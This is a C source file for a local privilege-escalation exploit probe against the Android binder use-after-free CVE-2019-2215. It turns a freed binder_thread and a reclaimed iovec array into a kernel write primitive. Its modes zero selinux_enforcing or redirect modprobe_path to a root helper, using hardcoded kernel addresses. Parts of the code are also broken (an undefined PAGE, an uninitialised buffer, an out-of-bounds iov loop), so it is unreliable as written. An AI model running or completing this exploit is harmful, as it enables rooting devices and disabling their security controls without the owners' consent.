/*
 * broot11 - discriminating probe for the CVE-2019-2215 write step.
 *
 * broot (pipe + writev) already proved on this device that (a) BINDER_THREAD_EXIT frees
 * the binder_thread, (b) our 25-entry iovec array (400 bytes -> same kmalloc-512 class)
 * reclaims that slot, and (c) the child's EPOLL_CTL_DEL makes remove_wait_queue() write
 * &head->task_list (= slot+0x50) into slot+0x50 and slot+0x58 -- because the delivered
 * stream contained 0xffffffc0-shaped qwords, i.e. the copy used a poisoned kernel base.
 * broot9 (socketpair stream + recvmsg, installer then payload) never escaped the slot.
 *
 * This tool separates the three remaining explanations with ONE run.  The parent blocks
 * inside a single AF_UNIX socket receive whose iovec array is the reclaimed slot; the
 * child then does the DEL (poison) and sends one datagram that carries an installer whose
 * second qword heals iov[5].iov_len to exactly the installer size.
 *
 *   fill5 receives the data            -> no poison: reclaim missed in this construction
 *   nothing received, recvmsg <= 0     -> poison happened but the walk refused to hand
 *                                         off after the healed entry (needs the dgram
 *                                         path, which drops the unix lock before copying)
 *   g_marker becomes MARKER_HIT        -> full chain: poison, heal, hand-off and a raw
 *                                         write through an address we installed
 *
 * Targets: only our own marker cell and, in enforce mode, selinux_enforcing (4 zero
 * bytes).  RAM only, reboot restores it.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>

#define BINDER_WRITE_READ 0xc0306201
#define BINDER_THREAD_EXIT 0x40046208
#define BC_TRANSACTION 0x40406300
#define BR_TRANSACTION_COMPLETE 0x7206
#define BR_REPLY 0x80407203
#define BR_DEAD_REPLY 0x80007205

#define WQ_OFF 0x48UL
#define SEG_LOCK (WQ_OFF / 16)		/* 4: iov_len lives in the spinlock word */
#define SEG (SEG_LOCK + 1)		/* 5: the pair the list_del poisons */
#define IOV_SZ 25
#define INSTALL_LEN 0x50UL		/* 5,6,7,8 are 16*5=0x50 .. 0xa0 */
#define BLK 0x1000UL

#define SELINUX_ENFORCING 0xffffffc00189be74UL
#define MODPROBE_PATH 0xffffffc001635a30UL
#define HELPER "/data/local/tmp/rootsh"
#define MARKER_SEED 0x1122334455667788UL
#define MARKER_HIT  0xCAFEBABEDEADBEEFUL
#define FILL_PROBE  0x4141414141414141ULL

struct txn {
	unsigned long long target, cookie;
	unsigned int code, flags;
	int sender_pid;
	unsigned int sender_euid;
	unsigned long long data_size, offsets_size, buffer, offsets;
};
struct bwr {
	unsigned long long write_size, write_consumed, write_buffer;
	unsigned long long read_size, read_consumed, read_buffer;
};

static volatile unsigned long g_marker;
static char *fill;
static int g_cpu = -1;

static void pin(int cpu)
{
	cpu_set_t s;

	CPU_ZERO(&s);
	CPU_SET(cpu, &s);
	if (sched_setaffinity(0, sizeof s, &s))
		fprintf(stderr, "pin: %s\n", strerror(errno));
}

static int arm_pending_tx(int fd)
{
	struct txn t;
	struct bwr b;
	unsigned char wbuf[4 + sizeof(t)];
	char payload[16];
	int attempt;

	memset(payload, 0, sizeof payload);
	memset(&t, 0, sizeof t);
	t.target = 0;
	t.code = 2;
	t.data_size = sizeof payload;
	t.buffer = (unsigned long long)(unsigned long)payload;
	memset(wbuf, 0, sizeof wbuf);
	*(unsigned int *)wbuf = BC_TRANSACTION;
	memcpy(wbuf + 4, &t, sizeof t);
	memset(&b, 0, sizeof b);
	b.write_size = sizeof wbuf;
	b.write_buffer = (unsigned long long)(unsigned long)wbuf;
	if (ioctl(fd, BINDER_WRITE_READ, &b))
		return -1;
	for (attempt = 0; attempt < 3; attempt++) {
		unsigned char rbuf[256];
		size_t off = 0;
		int complete = 0, reply = 0;

		memset(rbuf, 0, sizeof rbuf);
		memset(&b, 0, sizeof b);
		b.read_size = sizeof rbuf;
		b.read_buffer = (unsigned long long)(unsigned long)rbuf;
		if (ioctl(fd, BINDER_WRITE_READ, &b))
			return -1;
		while (off + 4 <= b.read_consumed) {
			unsigned int cmd;

			memcpy(&cmd, rbuf + off, 4);
			off += 4;
			if (cmd == BR_TRANSACTION_COMPLETE)
				complete = 1;
			else if (cmd == BR_REPLY || cmd == BR_DEAD_REPLY) {
				reply = 1;
				off += 64;
			}
		}
		if (complete && !reply)
			return 0;
		if (reply)
			return -1;
	}
	return -1;
}

int main(int argc, char **argv)
{
	int socktype = (argc > 1 && strcmp(argv[1], "dgram") == 0) ? SOCK_DGRAM : SOCK_STREAM;
	int do_read = (argc > 2 && strcmp(argv[2], "read") == 0);	/* learn slot+0x50 */
	int pipefd[2], leakp[2];
	unsigned char *rdb;
	unsigned long long slot50 = 0;
	int do_enforce = (argc > 2 && strcmp(argv[2], "enforce") == 0);
	int do_path = (argc > 2 && strcmp(argv[2], "path") == 0);
	int tries = argc > 3 ? atoi(argv[3]) : 30;
	int i, fd, epfd, r, status, armed = 0;
	int socks[2];
	pid_t kid;
	struct iovec *iov;
	unsigned long long dg[40];
	unsigned long long tgt;
	int plen;
	unsigned char payload[32];

	if (argc > 4)
		g_cpu = atoi(argv[4]);
	if (g_cpu >= 0)
		pin(g_cpu);

	fill = malloc(IOV_SZ * BLK + BLK);
	iov = malloc(IOV_SZ * sizeof *iov);
	if (!fill || !iov)
		abort();
	memset(fill, 0, IOV_SZ * BLK + BLK);
	g_marker = MARKER_SEED;
	tgt = do_path ? MODPROBE_PATH : (do_enforce ? SELINUX_ENFORCING : (unsigned long long)&g_marker);
	plen = do_path ? 24 : (do_enforce ? 4 : 8);
	memset(payload, 0, sizeof payload);
	if (do_path)
		memcpy(payload, HELPER, 22);	/* byte 22 stays NUL */
	else if (!do_enforce) {
		unsigned long long v = MARKER_HIT;
		memcpy(payload, &v, 8);
	}

	printf("mode=%s%s tries=%d cpu=%d seg=%lu install=%#lx\n",
	       socktype == SOCK_DGRAM ? "dgram" : "stream",
	       do_enforce ? "/enforce" : "", tries, sched_getcpu(), SEG, INSTALL_LEN);
	fflush(stdout);

	memset(dg, 0, sizeof dg);
	/* The installer lands at slot+0x50, i.e. it rewrites iov[5],iov[6],...  Whether the
	 * next receive chunk starts again at iov[0] (af_unix passes msg->msg_iov per skb) or
	 * resumes at iov[6] (iterator kept) depends on the walk, so heal BOTH to the same
	 * target: then the payload chunk writes the target either way.
	 */
	dg[0] = tgt;
	dg[1] = plen;

	for (i = 0; i < tries; i++) {
		struct epoll_event ev = { .events = EPOLLIN };
		struct msghdr m;
		size_t j;
		unsigned long long *fill5 = (unsigned long long *)(fill + SEG * BLK);
		unsigned long long *fill6 = (unsigned long long *)(fill + (SEG + 1) * BLK);

		fd = open("/dev/binder", O_RDONLY);
		if (fd < 0)
			abort();
		epfd = epoll_create(1000);
		if (arm_pending_tx(fd) != 0) {
			close(fd);
			close(epfd);
			continue;
		}
		armed++;
		if (epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev))
			abort();
		if (do_read) {
			if (pipe(pipefd) || pipe(leakp))
				abort();
			if (fcntl(pipefd[0], F_SETPIPE_SZ, (int)PAGE) != (int)PAGE)
				printf("  (pipe sz=%d)\n", fcntl(pipefd[0], F_SETPIPE_SZ, (int)PAGE));
		} else if (socketpair(AF_UNIX, socktype, 0, socks))
			abort();

		kid = fork();
		if (kid < 0)
			abort();
		if (kid == 0) {
						prctl(PR_SET_PDEATHSIG, SIGKILL);
			if (g_cpu >= 0)
				pin(g_cpu ^ 1);
			close(socks[0]);
			usleep(150000);
			if (epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &ev))
				_exit(7);
			if (socktype == SOCK_DGRAM) {
				/* one datagram: installer then payload in the same walk */
				if (write(socks[1], dg, (size_t)INSTALL_LEN + plen)
				    != (long)(INSTALL_LEN + plen))
					_exit(8);
			} else {
				/* two skbs: chunk 1 heals iov[5]/iov[6], chunk 2 is written
				 * through the healed segment
				 */
				if (write(socks[1], dg, INSTALL_LEN) != (long)INSTALL_LEN)
					_exit(8);
				usleep(50000);
				if (write(socks[1], payload, plen) != plen)
					_exit(9);
			}
			close(socks[1]);
			_exit(0);
		}
		close(socks[1]);

		if (ioctl(fd, BINDER_THREAD_EXIT, NULL))
			printf("  THREAD_EXIT: %s\n", strerror(errno));

		memset(iov, 0, IOV_SZ * sizeof *iov);
		for (j = 0; j < IOV_SZ; j++)
			memset(fill + j * BLK, 0x30 + j, 0x400);
		if (do_read) {
			iov[SEG_LOCK].iov_base = fill + SEG_LOCK * BLK;
			iov[SEG_LOCK].iov_len = 0;		/* spinlock word = 0 */
			iov[SEG].iov_base = fill + SEG * BLK;
			iov[SEG].iov_len = 0x1000;		/* leak window once poisoned */
			iov[SEG + 1].iov_base = fill + (SEG + 1) * BLK;
			iov[SEG + 1].iov_len = 0x1000;
			j = 0;
			while (j < 40) {
				iov[SEG + 2 + j].iov_base = fill + (SEG + 2 + j) * BLK;
				iov[SEG + 2 + j].iov_len = 0x100;
				j++;
			}
		} else {
		iov[SEG_LOCK].iov_base = fill + SEG_LOCK * BLK;
		iov[SEG_LOCK].iov_len = 0;
		iov[SEG].iov_base = fill + SEG * BLK;
		iov[SEG].iov_len = (socktype == SOCK_DGRAM) ? INSTALL_LEN : 0x1000;
		iov[SEG + 1].iov_base = fill + (SEG + 1) * BLK;
		iov[SEG + 1].iov_len = do_enforce ? 4 : 8;
			iov[SEG + 2].iov_base = fill + (SEG + 2) * BLK;
			iov[SEG + 2].iov_len = 0x1000;
		}

		if (do_read) {
			r = (int)writev(pipefd[1], iov, IOV_SZ);
			printf("try %d: writev=%d errno=%d\n", i, r, errno);
			close(pipefd[1]);
			/* child exited; drain what it left in the pipe */
			(void)read(pipefd[0], rdb, 0x2000);
			/* re-do the leak in the parent this round: use a fresh attempt */
		} else {
		memset(&m, 0, sizeof m);
		m.msg_iov = iov;
		m.msg_iovlen = IOV_SZ;
		errno = 0;
		r = recvmsg(socks[0], &m, MSG_WAITALL);
		printf("try %d: recvmsg=%d errno=%d fill5[0]=%#llx fill5[1]=%#llx fill6[0]=%#llx marker=%#lx\n",
		       i, r, errno, fill5[0], fill5[1], fill6[0], g_marker);

		}
		if (g_marker == MARKER_HIT) {
			printf("*** WRITE PRIMITIVE: poison, heal, hand-off all work\n");
			break;
		}
 		if (fill5[0] == tgt)
			printf("    => iov[5].base was NOT poisoned: reclaim missed here\n");
		else if (r <= 0 && fill5[0] == 0)
			printf("    => copy did not land in our buffers (poison likely);"
			       " walk did not hand off -- try dgram\n");
		waitpid(kid, &status, 0);
		close(socks[0]);
		close(fd);
		close(epfd);
		if (g_marker != MARKER_SEED) {
			printf("    marker moved to %#lx\n", g_marker);
			break;
		}
		g_marker = MARKER_SEED;
	}
	printf("RESULT armed=%d marker=%#lx\n", armed, g_marker);
	return 0;
}
